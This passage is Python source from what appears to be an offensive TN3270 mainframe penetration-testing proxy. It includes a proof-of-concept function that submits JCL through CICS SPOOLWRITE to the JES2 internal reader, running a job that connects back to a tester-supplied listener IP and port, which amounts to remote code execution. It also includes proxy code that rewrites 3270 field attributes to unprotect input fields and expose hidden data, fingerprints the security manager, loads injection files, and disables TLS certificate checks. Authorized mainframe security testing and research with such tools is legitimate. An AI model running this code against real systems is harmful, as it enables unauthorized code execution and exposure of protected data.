            'response_preview': re.sub(r'\[0x[0-9A-Fa-f]{2}\]', '', open_text).strip()[:300],
            'timestamp': time.time(),
        }

        # Check if SPOOLOPEN succeeded
        spool_open = any(p in open_upper for p in SPOOL_SUCCESS_PATTERNS)

        if spool_open:
            # Close the spool handle cleanly
            close_cmd = 'CECI SPOOLCLOSE TOKEN(H3TK)'
            self._spool_send_and_read(close_cmd, is_tn3270e)
            result['status'] = 'SPOOL_OPEN'
            result['detail'] = 'SPOOLOPEN returned NORMAL — SPOOL API accessible. RCE via INTRDR is possible.'
            self.emit_finding('CRIT', 'SPOOL', 'SPOOL API accessible — RCE via INTRDR possible',
                              dedup_key='SPOOL:OPEN',
                              constat='SPOOL API accessible via CECI SPOOLOPEN. JES2 INTRDR write possible (RCE).')
        else:
            result['status'] = 'SPOOL_CLOSED'
            fail_reason = 'Unknown'
            for p in SPOOL_FAIL_PATTERNS:
                if p in open_upper:
                    fail_reason = p
                    break
            result['detail'] = 'SPOOLOPEN denied: {}'.format(fail_reason)

        self.logger.debug("SPOOL check result: {}".format(result['status']))
        return result

    def spool_poc_ftp(self, listener_ip, listener_port):
        '''Level 2: Active PoC — writes FTP JCL via SPOOLWRITE.
        Submits a job that connects back to listener_ip:listener_port.
        Returns dict with status and details.'''
        is_tn3270e = self.check_inject_3270e()
        port_str = str(listener_port)

        results = []

        # Step 1: SPOOLOPEN
        open_cmd = 'CECI SPOOLOPEN OUTPUT TOKEN(H3TK)'
        open_text, _ = self._spool_send_and_read(open_cmd, is_tn3270e)
        open_upper = open_text.upper()

        if not any(p in open_upper for p in SPOOL_SUCCESS_PATTERNS):
            return {'status': 'SPOOL_CLOSED', 'detail': 'SPOOLOPEN failed — cannot proceed.',
                    'results': [], 'timestamp': time.time()}

        # Step 2: Write JCL lines
        jcl_lines = [
            '//H3FTPJB JOB ,H3270,CLASS=A,MSGCLASS=H',
            '//STEP1   EXEC PGM=FTP',
            '//INPUT   DD *',
            'OPEN {} {}'.format(listener_ip, port_str),
            'QUIT',
            '/*',
        ]

        all_ok = True
        for line in jcl_lines:
            # CECI SPOOLWRITE with FROM() — max 72 chars per JCL line
            write_cmd = "CECI SPOOLWRITE TOKEN(H3TK) FROM('{}')".format(line)
            write_text, _ = self._spool_send_and_read(write_cmd, is_tn3270e)
            write_upper = write_text.upper()
            ok = any(p in write_upper for p in SPOOL_SUCCESS_PATTERNS)
            results.append({'line': line, 'ok': ok, 'response': write_text[:200]})
            if not ok:
                all_ok = False
                break

        # Step 3: SPOOLCLOSE to submit
        close_cmd = 'CECI SPOOLCLOSE TOKEN(H3TK)'
        close_text, _ = self._spool_send_and_read(close_cmd, is_tn3270e)

        status = 'SPOOL_OPEN' if all_ok else 'ERROR'
        detail = ('FTP PoC submitted — job H3FTPJB should connect to {}:{}. '
                  'Check your listener.'.format(listener_ip, port_str) if all_ok
                  else 'SPOOLWRITE failed during JCL submission.')

        result = {
            'status': status,
            'detail': detail,
            'jcl_lines': len(jcl_lines),
            'lines_written': sum(1 for r in results if r['ok']),
            'results': results,
            'listener': '{}:{}'.format(listener_ip, port_str),
            'timestamp': time.time(),
        }

        self.logger.debug("SPOOL PoC FTP result: {}".format(status))
        return result



    # ---- Single Transaction Scan Methods ----

    def fingerprint_esm(self, server_data):
        '''Detects the ESM (External Security Manager) from response patterns.'''
        ascii_text = self.get_ascii(server_data).upper()
        evidence = []

        # RACF prefixes
        for prefix in ['ICH408I', 'ICH409I', 'ICH70001I', 'IRR012I', 'IRR013I']:
            if prefix in ascii_text:
                evidence.append(prefix)
        if evidence:
            return {'esm': 'RACF', 'evidence': evidence}

        # ACF2
        for prefix in ['ACF2', 'ACF01']:
            if prefix in ascii_text:
                evidence.append(prefix)
        if evidence:
            return {'esm': 'ACF2', 'evidence': evidence}

        # Top Secret
        for prefix in ['TSS7000I', 'TSS7001I', 'TOP SECRET']:
            if prefix in ascii_text:
                evidence.append(prefix)
        if evidence:
            return {'esm': 'TOP_SECRET', 'evidence': evidence}

        return {'esm': 'UNKNOWN', 'evidence': []}

    def analyze_screen_fields(self, screen_map):
        '''Analyzes screen_map for security-relevant field statistics.'''
        total = len(screen_map)
        input_count = 0
        protected_count = 0
        hidden_count = 0
        numeric_count = 0
        hidden_fields = []

        for f in screen_map:
            if f.get('type') == 'input':
                input_count += 1
            if f.get('protected'):
                protected_count += 1
            if f.get('numeric'):
                numeric_count += 1
            if f.get('hidden'):
                hidden_count += 1
                hidden_fields.append({
                    'row': f.get('row', 0),
                    'col': f.get('col', 0),
                    'content': f.get('content', ''),
                })

        return {
            'total': total,
            'input': input_count,
            'protected': protected_count,
            'hidden': hidden_count,
            'numeric': numeric_count,
            'hidden_fields': hidden_fields,
        }

    def list_injection_files(self):
        '''Lists available injection files from the injections/ directory'''
        injection_dir = Path(__file__).parent / 'injections'
        if not injection_dir.is_dir():
            return []
        return sorted([f.name for f in injection_dir.iterdir()
                       if f.is_file() and f.suffix == '.txt'])

    ## TCP/IP Functions

    def client_connect(self):
        '''
        Creates the proxy server on proxy_ip, proxy_port
        '''
        
        self.logger.debug("Setting up proxy listener on {}:{}".format(
            self.proxy_ip, self.proxy_port
        ))

        client_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        client_sock.bind((self.proxy_ip, self.proxy_port))
        client_sock.listen(4)

        self.logger.debug("Waiting for connection on {}:{}".format(
            self.proxy_ip, self.proxy_port
        ))

        (conn, (ip,port)) = client_sock.accept()

        self.logger.debug("Proxy Connection from {}:{}".format(ip,port))

        self.client = conn

    def server_connect(self):
        '''
        Connects to a TN3270 server on server_ip, server_port
        '''
        if self.offline_mode:
            raise Exception("Cannot connect when in Offline Mode")
        
        self.logger.debug("Connecting to {}:{}".format(
            self.server_ip,self.server_port))
        
        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        if self.tls_enabled:
            self.logger.debug("Connecting with TLS")
            self.context = ssl.create_default_context()
            self.context.check_hostname = False
            self.context.verify_mode = ssl.CERT_NONE
            self.logger.warning("TLS certificate verification disabled (pentest mode)")
            try:
                self.server = self.context.wrap_socket(
                    server_sock, server_hostname=self.server_ip)
            except ssl.SSLError as e:
                self.logger.error("TLS handshake failed: {}".format(e))
                raise
        else:
            self.server = server_sock

        self.server.connect((self.server_ip, self.server_port))
        self.logger.debug("Connected to {}:{}".format(
            self.server_ip,self.server_port))

    def handle_server(self,server_data):
        log_line = ''
        self.last_server_data = server_data
        if len(server_data) > 0:
            if self.hack_on:
                log_line = self.hack_on_logline()

            # Hack Color is always on — always run manipulate()
            hacked_server = self.manipulate(server_data)
            self.client.send(hacked_server)
            
            self.write_database_log('S', log_line, server_data)

            # PR2: Parse screen map
            self.parse_screen_map(server_data)

            # PR1: ABEND detection (always on)
            abends = self.detect_abend(server_data)
            for abend in abends:
                # Get the log ID of the record just written
                self.sql_cur.execute("SELECT MAX(ID) FROM Logs")
                log_id = self.sql_cur.fetchone()[0]
                self.write_abend_log(abend, log_id)
                # Emit finding
                txn = self.pending_transaction['code'] if self.pending_transaction else None
                sev = ABEND_SEVERITY.get(abend['code'], 'MEDIUM')
                constat = 'ABEND {} ({}) detected on transaction {}. Passive detection (log #{}).'.format(
                    abend['code'], abend['description'], txn or 'unknown', log_id)
                self.emit_finding(sev, 'ABEND', '{}: {}'.format(abend['code'], abend['description']),
                                  txn_code=txn, dedup_key='ABEND:{}:{}'.format(abend['code'], txn or ''),
                                  constat=constat)
                # Annotate the log notes
                self.sql_cur.execute(
                    "UPDATE Logs SET NOTES = NOTES || ? WHERE ID = ?",
                    (' [ABEND: {}]'.format(abend['code']), log_id)
                )
                self.sql_con.commit()


    def daemon(self):

        # Tend to client sending data
        rlist, w, e = select.select([self.client, self.server], [], [], 0)
        if self.client in rlist:

            self.logger.debug("Client Data Detected")
            client_data = self.client.recv(BUFFER_MAX)
            if len(client_data) > 0:
                self.logger.debug("Client: {}".format(bytes(client_data)))
                self.logger.debug("Client: {}".format(self.get_ascii(client_data)))
                if self.inject_setup_capture:
                    self.capture_mask(client_data)
                else:
                    self.write_database_log('C', '', client_data)
                    # PR3: Transaction correlation (always on)
                    txn_code = self.detect_transaction_code(client_data)
                    if txn_code:
                        self.start_transaction(txn_code)
                self.server.send(client_data)

        # Tend to server sending data
        if self.server in rlist:
            self.logger.debug("Server Data Detected")
            self.server_data = self.server.recv(BUFFER_MAX)
            if len(self.server_data) > 0:
                self.logger.debug("Server: {}".format(bytes(self.server_data)))
                self.logger.debug("Server: {}".format(self.get_ascii(self.server_data)))
                self.handle_server(self.server_data)
                self.refresh_aids(self.server_data)
                # PR3: Complete pending transaction (always on)
                if self.pending_transaction:
                    self.complete_transaction(self.server_data)

        if self.hack_toggled: # Resend data to client when hack fields toggled
            self.logger.debug("Hack Toggled, resending data to client")

            if len(self.server_data) > 0:
                if self.hack_on:
                    log_line = ('Hack Field Attributes: TOGGLED ON ('
                                'Remove Field Prot: {pt}  - '
                                'Show Hidden: {hf} - '
                                'Remove NUM Prot: {rnr}) ('
                                'SF: {sf} - '
                                'SFE: {sfe} - '
                                'MF: {mf}  - '
                                'EI: {ei} - '
                                'HV: {hv})').format(
                                    pt=self.hack_prot,
                                    hf=self.hack_hf,
                                    rnr=self.hack_rnr,
                                    sf=self.hack_sf,
                                    sfe=self.hack_sfe,
                                    mf=self.hack_mf,
                                    ei=self.hack_ei,
                                    hv=self.hack_hv
                                    )
                else:
                    log_line = 'Hack Fields Attributes: TOGGLED OFF '

                self.hack_toggled = 0

                hacked_server = self.manipulate(self.server_data)
                self.client.send(hacked_server)
                self.write_database_log('S', log_line, hacked_server)

    def recv(self):
        self.client.recv(BUFFER_MAX)

    def expand_CS(self, text):
        '''
        The datase stores client and server communication as one byt
        this function converts it to a string

            Returns: Either Client or Server
        '''
        if text == "C":
            return("Client")
        elif text == "S":
            return("Server")
        
    def capture_mask(self, client_data):

        preamble_count = 0
        mask_count = 0
        
        self.logger.debug("Capturing Mask location with mask {}".format(
                        self.inject_mask))
        
        for x in range(0, len(client_data) - 1):
            character = self.get_ascii(client_data[x].to_bytes(1, 'little'))
            if character != self.inject_mask:
                preamble_count += 1
            else:
                break

        for x in range(preamble_count, len(client_data)):
            character = self.get_ascii(client_data[x].to_bytes(1, 'little'))
            if character == self.inject_mask:
                mask_count += 1
            else:
                break

        if mask_count > 0:
            self.logger.debug(("Mask found (length: {})"
            " - Input field identified - Ready for injection.").format(
                                                                mask_count))
            self.inject_mask_len = mask_count
            self.inject_preamble = client_data[:preamble_count]
            self.inject_postamble = client_data[preamble_count + mask_count:]
            self.inject_config_set = 1
            log = 'Inject setup - Mask: {} - Length: {}'.format(self.inject_mask,mask_count)
            self.logger.debug(log)
            self.write_database_log('C', log, client_data)
        else:
            self.inject_mask_len = 0
            self.inject_config_set = 0
            log = 'Inject setup - Mask: {} - Mask not found!'.format(self.inject_mask)
            self.logger.debug(log)
            self.write_database_log('C', log, client_data)
        self.inject_setup_capture = False

    def hack_on_logline(self):
        return ("Hack Field Attributes: ENABLED ("
                                    "Remove Field Prot: {rfp} - "
                                    "Show Hidden: {sh} - "
                                    "Remove NUM Prot: {rnr}) ("
                                    "SF: {sf} - "
                                    "SFE: {sfe} - "
                                    "MF: {mf} - " 
                                    "EI: {ei} - "
                                    "HV: {hv} )"
                                    ).format(
                                        rfp=self.hack_prot,
                                        sh=self.hack_hf,
                                        rnr=self.hack_rnr,
                                        sf=self.hack_sf,
                                        sfe=self.hack_sfe,
                                        mf=self.hack_mf,
                                        ei=self.hack_ei,
                                        hv=self.hack_color_hv)

    def get_ascii(self, ebcdic_string):
        ''' Converts EBCDIC to ASCII, returns ASCII string'''
        my_string = ""
        for x in range(0, len(ebcdic_string)):
            my_string += e2a[ebcdic_string[x]]
        return my_string

    def get_ebcdic(self, string):
        ''' Converts ASCII to EBCDIC, returns EBCDIC bytes'''
        my_string = b''
        for x in range(0, len(string)):
            for y in range(0, len(e2a)):
                if string[x] == e2a[y]:
                    my_string += y.to_bytes(1, 'little')
        return(my_string)
        
    def refresh_aids(self, server_data):
        '''
        Repopulates found_aids, poplates the array with any found aids
        '''
        search_string = "PF{}[^0-9]"
        self.found_aids = []
        server_ascii = self.get_ascii(server_data)
        for i in range(1,25):
            search_string.format(i)
            self.logger.debug("Searching for PF{}".format(i))
            if re.search(search_string.format(i), server_ascii):
                self.logger.debug("Found PF{}".format(i))
                self.found_aids.append("PF{}".format(i))
        self.logger.debug("Done")
    
    def current_aids(self):
        'Returns an array of PF keys found on the screen'
        #self.logger.debug("Found the Following Action Identifiers: {}".format(
        #    self.found_aids
        #))
        return self.found_aids

    def flip_bits(self, tn3270_data):
        '''
        Flips the Protected, Non-display, and numeric bits in the TN3270
        based on the values in hack_prot, hack_hf, hack_rnr.

        Args:
            tn3270_data (byte): tn3270 byte

        Returns: byte with bit changes
        '''
        value = tn3270_data
        self.logger.debug("Flipping bits in {:02X}".format(tn3270_data))
        # Turn of 'Protected' Flag (Bit 6) if Set
        if self.hack_prot:
            self.logger.debug("Flipping Protected bit")
            if value & 0b00100000 == 0b00100000:
                value ^= 0b00100000
        # Turn off 'Non-display' Flag (Bit 4) if Set (i.e. Bits 3 and 4 are on)
        if self.hack_hf:
            self.logger.debug("Flipping Non-display bit")
            if value & 0b00001100 == 0b00001100:
        # Flip bit 3 instead of 4 if enable intentisty is selected
                if self.hack_ei:
                    self.logger.debug("Flipping intensity bit")
                    value ^= 0b00000100
                else:
                    value ^= 0b00001000
        # Turn off 'Numeric Only' Flag (Bit 5) if Set
        if self.hack_rnr:
            self.logger.debug("Flipping Numeric bit")
            if value & 0b00010000 == 0b00010000:
                value ^= 0b00010000
        self.logger.debug("Flipped bits: {:02X}".format(tn3270_data))
        return(value)

    def check_hidden(self, tn3270_data):
        '''
        Checks for the existence of the hidden bit

        Args:
            tn3270_data (byte): a tn3270 byte
        
        Returns:
            True if hidden bit is found otherwise False
        '''
        #if passed_value & 0b00001100 == 0b00001100:
        if tn3270_data & 12 == 12:
            self.logger.debug("Hidden TN3270 Flag detected")
            return True
        else:
            self.logger.debug("Hidden TN3270 Flag not detected")
            return False

    def manipulate(self, tn3270_data):

        self.current_state_debug_msg()
        found_hidden_data = 0
        # Don't manipulate data if telnet
        if tn3270_data[0] == 255:
            self.logger.debug("Received Telnet data, returning")
            return(tn3270_data)

        data = bytearray(len(tn3270_data))
        data[:] = tn3270_data

        self.logger.debug("Data recieved: {}".format(data.hex()))
        self.logger.debug("Hack on: {}".format(self.hack_on))
        # Process hacking of Basic Field Attributes
        if self.hack_on:
            for x in range(len(data)):
                #self.logger.debug("Current Byte: {}".format(data[x]))

                if self.hack_sf and data[x] == 0x1d: # Start Field
                    self.logger.debug("Start Field found")

                    data[x + 1] = self.flip_bits(data[x + 1])
                    if self.hack_hf and self.check_hidden(data[x + 1]):
                        #self.logger.debug("Disabling found Hidden Field")
                        bfa_byte = data[x + 1].to_bytes(1, byteorder='little')
                        if self.hack_hv:
                            self.logger.debug("Enabling High Visibility")
                            data2 = bytearray(len(data) + 6)
                            data2 = data[:x] + b'\x29\x03\xc0' + bfa_byte + b'\x41\xf2\x42\xf6' + data[x + 2:]
                            data = data2
                            x = x + 6
                        else:
                            data2 = bytearray(len(data) + 4)
                            data2 = data[:x + 2] + b'\x28\x42\xf6' + data[x + 2:]
                            data2 = data[:x] + b'\x29\x02\xc0' + bfa_byte + b'\x42\xf6' + data[x + 2:]
                            x = x + 4

                elif data[x] == 0x29: # Start Field Extended
                    self.logger.debug("Start Field Extended found, looping over {} fields".format(data[x + 1]))

                    for y in range(data[x + 1]):
                        
                        if(len(data) < ((x + 3) + (y * 2))):
                            continue
                        if self.hack_sfe and data[((x + 3) + (y * 2)) - 1] == 0xc0: # Basic 3270 field attributes
                            if self.check_hidden(data[((x + 3) + (y * 2))]) and self.hack_hv:
                                found_hidden_data = 1
                            data[((x + 3) + (y * 2))] = self.flip_bits(data[((x + 3) + (y * 2))])
                    if self.hack_sfe and found_hidden_data:
                        data[x + 1] = data[x + 1] + 2
                        data2 = bytearray(len(data) + 4)
                        data2 = data[:x + (data[x + 1] * 2) - 2] + b'\x41\xf2\x42\xf6' + data[x + (data[x + 1] * 2) - 2:]
                        data = data2
                        x = x + 4
                        found_hidden_data = 0
                    continue
                elif data[x] == 0x2c: # Modify Field
                    for y in range(data[x + 1]):
                        if(len(data) < ((x + 3) + (y * 2))):
                            continue
                        if self.hack_mf and data[((x + 3) + (y * 2)) - 1] == 0xc0: # Basic 3270 field attributes
                            if self.check_hidden(data[((x + 3) + (y * 2))]) and self.hack_hv:
                                found_hidden_data = 1
                            data[((x + 3) + (y * 2))] = self.flip_bits(data[((x + 3) + (y * 2))])
                    if self.hack_mf and found_hidden_data:
                        data[x + 1] = data[x + 1] + 2
                        data2 = bytearray(len(data) + 4)
                        data2 = data[:x + (data[x + 1] * 2) - 2] + b'\x41\xf2\x42\xf6' + data[x + (data[x + 1] * 2) - 2:]
                        data = data2
                        x = x + 4
                        found_hidden_data = 0
                    continue

        # Process hacking of Colors (always on — reveal black-on-black fields)
        for x in range(len(data)):
            if data[x] == 0x29: # Start Field Extended
                for y in range(data[x + 1]):
                    if(len(data) < ((x + 3) + (y * 2))):
                        continue
                    if data[((x + 3) + (y * 2)) - 1] == 0x42: # Color
                        if data[((x + 3) + (y * 2))] == 0xf8: # Black
                            data[x + 1] = data[x + 1] + 2
                            data2 = bytearray(len(data) + 4)
                            data2 = data[:((x + 3) + (y * 2)) + 1] + b'\x41\xf2\x42\xf6' + data[((x + 3) + (y * 2)) + 1:]
                            x = x + 4
                            data = data2
            elif data[x] == 0x28: # Set Attribute
                if data[x + 1] == 0x42: # Color
                    if data[x + 2] == 0xf8: # Black
                        data2 = bytearray(len(data) + 6)
                        data2 = data[:x + 3] + b'\x28\x41\xf2\x28\x42\xf6' + data[x + 3:]
                        x = x + 6
                        data = data2
                continue
            elif data[x] == 0x2c: # Modify Field
                for y in range(data[x + 1]):
                    if(len(data) < ((x + 3) + (y * 2))):
                        continue
                    if data[((x + 3) + (y * 2)) - 1] == 0x42: # Color
                        if data[((x + 3) + (y * 2))] == 0xf8: # Black
                            data[x + 1] = data[x + 1] + 2
                            data2 = bytearray(len(data) + 4)
                            data2 = data[:((x + 3) + (y * 2)) + 1] + b'\x41\xf2\x42\xf6' + data[((x + 3) + (y * 2)) + 1:]
                            x = x + 4
                            data = data2
                continue

        return(data)
        
    def parse_telnet(self, ebcdic_string):
        self.logger.debug("Parsing Telnet bytes: {}".format(ebcdic_string))
        return_string = re.sub('\\[0xFF\\]', '[IAC]', ebcdic_string)
        return_string = re.sub('\\[0xFE\\]', '[DON\'T]', return_string)
        return_string = re.sub('\\[0xFD\\]', '[DO]', return_string)
        return_string = re.sub('\\[0xFC\\]', '[WON\'T]', return_string)
        return_string = re.sub('\\[0xFB\\]', '[WILL]', return_string)
        return_string = re.sub('\\[0xFA\\]', '[SB]', return_string)
        return_string = re.sub('\\[0x29\\]', '[3270-REGIME]', return_string)
        return_string = re.sub('\\[0x18\\]', '[TERMINAL-TYPE]', return_string)
        return_string = re.sub('\\[0x19\\]', '[END-OF-RECORD]', return_string)
        return_string = re.sub('\\[0x28\\]', '[TN3270E]', return_string)
        return_string = re.sub('\\[0x01\\]', '[SEND]', return_string)
        return_string = re.sub('\\[DO\\]\\[0x00\\]', '[DO][TRANSMIT-BINARY]', return_string)
        return_string = re.sub('\\[DON\'T\\]\\[0x00\\]', '[DON\'T][TRANSMIT-BINARY]', return_string)
        return_string = re.sub('\\[WILL\\]\\[0x00\\]', '[WILL][TRANSMIT-BINARY]', return_string)
        return_string = re.sub('\\[WON\'T\\]\\[0x00\\]', '[WON\'T][TRANSMIT-BINARY]', return_string)
        return_string = re.sub('\\[0x00\\]', '[IS]', return_string)
        return_string = re.sub('\\[0x49\\]\\[0x42\\]\(\\[0x2D\\]\\[0x33\\]\\[0x32\\]\\[0x37\\]\\[0x39\\]\\[0x2D\\]\\[0x32\\]\\[0x2D\\]\\[0x45\\]', '[IBM-3270-2-E]', return_string)
        return_string = re.sub('\\[0x49\\]\\[0x42\\]\(\\[0x2D\\]\\[0x33\\]\\[0x32\\]\\[0x37\\]\\[0x39\\]\\[0x2D\\]\\[0x33\\]\\[0x2D\\]\\[0x45\\]', '[IBM-3270-3-E]', return_string)
        return_string = re.sub('\\[0x49\\]\\[0x42\\]\(\\[0x2D\\]\\[0x33\\]\\[0x32\\]\\[0x37\\]\\[0x39\\]\\[0x2D\\]\\[0x34\\]\\[0x2D\\]\\[0x45\\]', '[IBM-3270-4-E]', return_string)
        return_string = re.sub('\\[0x49\\]\\[0x42\\]\(\\[0x2D\\]\\[0x33\\]\\[0x32\\]\\[0x37\\]\\[0x39\\]\\[0x2D\\]\\[0x35\\]\\[0x2D\\]\\[0x45\\]', '[IBM-3270-5-E]', return_string)
        return_string = re.sub('\\[0x49\\]\\[0x42\\]\(\\[0x2D\\]\\[0x33\\]\\[0x32\\]\\[0x37\\]\\[0x39\\]\\[0x2D\\]\\[0x44\\]\\[0x59\\]\\[0x4E\\]\\[0x41\\]\\[0x4D\\]\\[0x49\\]\\[0x43\\]', '[IBM-3270-DYNAMIC]', return_string)
        return_string = re.sub('\\[TN3270E\\]\\[0x08\\]\\[0x02\\]', '[TN3270E][SEND][DEVICE-TYPE]', return_string)
        return_string = re.sub('\\[TN3270E\\]\\[0x02\\]\\[0x07\\]', '[TN3270E][DEVICE-TYPE][REQUEST]', return_string)
        return_string = re.sub('\\[TN3270E\\]\\[0x02\\]\\[0x04\\]', '[TN3270E][DEVICE-TYPE][IS]', return_string)
        return_string = re.sub('\\]0$', '][SE]', return_string)
        self.logger.debug("Converted to: {}".format(return_string))
        return(return_string)

    def parse_3270(self, ebcdic_string):
        self.logger.debug("Parsing TN3270 bytes: {}".format(ebcdic_string))
        return_string = re.sub('\\[0x29\\]', '\n[Start Field Extended]', ebcdic_string)
        return_string = re.sub('\\[0x1D\\]', '\n[Start Field]', return_string)
        return_string = re.sub('\\[Start Field\\]0', '[Start Field][11110000]', return_string)
        return_string = re.sub('\\[Start Field\\]1', '[Start Field][11110001]', return_string)
        return_string = re.sub('\\[Start Field\\]2', '[Start Field][11110010]', return_string)
        return_string = re.sub('\\[Start Field\\]3', '[Start Field][11110011]', return_string)
        return_string = re.sub('\\[Start Field\\]4', '[Start Field][11110100]', return_string)
        return_string = re.sub('\\[Start Field\\]5', '[Start Field][11110101]', return_string)
        return_string = re.sub('\\[Start Field\\]6', '[Start Field][11110110]', return_string)
        return_string = re.sub('\\[Start Field\\]7', '[Start Field][11110111]', return_string)
        return_string = re.sub('\\[Start Field\\]8', '[Start Field][11111000]', return_string)
        return_string = re.sub('\\[Start Field\\]9', '[Start Field][11111001]', return_string)
        return_string = re.sub('\\[Start Field\\]A', '[Start Field][11000001]', return_string)
        return_string = re.sub('\\[Start Field\\]B', '[Start Field][11000010]', return_string)
        return_string = re.sub('\\[Start Field\\]C', '[Start Field][11000011]', return_string)
        return_string = re.sub('\\[0x28\\]', '[Set Attribute]', return_string)
        return_string = re.sub('{', '[Basic Field Attribute]', return_string)
        return_string = re.sub('\\[0x41\\]\\[0x00\\]', '[Highlighting - Default]', return_string)
        return_string = re.sub('\\[0x41\\]0', '[Highlighting - Normal]', return_string)
        return_string = re.sub('\\[0x41\\]1', '[Highlighting - Blink]', return_string)
        return_string = re.sub('\\[0x41\\]2', '[Highlighting - Reverse]', return_string)
        return_string = re.sub('\\[0x41\\]4', '[Highlighting - Underscore]', return_string)
        return_string = re.sub('\\[0x41\\]8', '[Highlighting - Intensity]', return_string)
        return_string = re.sub('\\[0x42\\]\\[0x00\\]', '[Color - Default]', return_string)
        return_string = re.sub('\\[0x42\\]0', '[Color - Neutral/Black]', return_string)
        return_string = re.sub('\\[0x42\\]1', '[Color - Blue]', return_string)
        return_string = re.sub('\\[0x42\\]2', '[Color - Red]', return_string)
        return_string = re.sub('\\[0x42\\]3', '[Color - Pink]', return_string)
        return_string = re.sub('\\[0x42\\]4', '[Color - Green]', return_string)
        return_string = re.sub('\\[0x42\\]5', '[Color - Yellow]', return_string)
        return_string = re.sub('\\[0x42\\]6', '[Color - Yellow]', return_string)
        return_string = re.sub('\\[0x42\\]7', '[Color - Neutral/White]', return_string)
        return_string = re.sub('\\[0x11\\]', '\n[Move Cursor Position]', return_string)
        return_string = re.sub('\\[Basic Field Attribute\\] \\[ ', '[Basic Field Attribute][0x40][', return_string)
        self.logger.debug("Converted to: {}".format(return_string))
        return(return_string)
